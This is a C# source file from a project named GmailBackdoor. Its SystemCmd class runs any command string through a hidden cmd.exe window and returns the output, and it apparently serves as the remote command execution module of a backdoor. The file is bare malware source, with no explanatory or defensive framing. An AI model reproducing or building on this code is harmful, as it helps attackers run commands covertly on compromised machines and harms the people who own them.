using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GmailBackdoor.Commands
{
    public class SystemCmd
    {
        public static string Go(string cmd)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine(cmd);
                process.StandardInput.Flush();
                process.StandardInput.Close();
                //process.WaitForExit();
                return process.StandardOutput.ReadToEnd();
            }
        }
    }
}
